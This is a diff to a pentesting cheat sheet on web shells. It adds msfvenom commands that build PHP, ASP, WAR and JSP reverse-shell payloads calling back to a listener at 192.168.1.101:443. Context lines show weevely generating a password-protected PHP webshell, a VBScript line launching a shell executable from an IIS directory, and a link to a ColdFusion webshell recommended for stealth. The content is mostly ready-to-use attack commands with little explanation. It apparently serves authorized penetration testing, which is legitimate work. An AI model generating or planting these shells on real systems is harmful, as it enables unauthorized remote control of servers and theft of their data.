@@ -73,7 +73,7 @@ str_rot13()
 
 ### Weevely
 
-Using weevely we can create php webshells easily.
+Using weevely we can create php webshells:
 
 ```
 weevely generate password /root/webshell.php
@@ -98,16 +98,40 @@ Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
 
 ## Coldfusion
 
-There's the standard CFM webshell included with Kali, but it doesn't have that many features and can be a slight pain to get working.  If you're going for stealth, it's easier to modify but I'd recommend the CFM v3 Webshell.
+There's the standard CFM webshell included with Kali, but it doesn't have that many features and can be a slight pain to get working.  If you're going for stealth, it's easier to modify but I'd recommend the CFM v3 Webshell:
 
 [https://github.com/Reboare/Cfm\_Shell\_v3.0\_edition](https://github.com/Reboare/Cfm_Shell_v3.0_edition)
 
 This one allows easy directory traversal which the standard Kali one lacks.
 
+## MSFVenom - Platform Independent
+
+### PHP
+
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
+```
+
+### ASP
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
+```
+
+### WAR
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
+```
+
+### JSP
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
+```
+
 ## References
 
 [http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/](http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/)  
 [http://www.binarytides.com/web-shells-tutorial/](http://www.binarytides.com/web-shells-tutorial/)
-
-
 
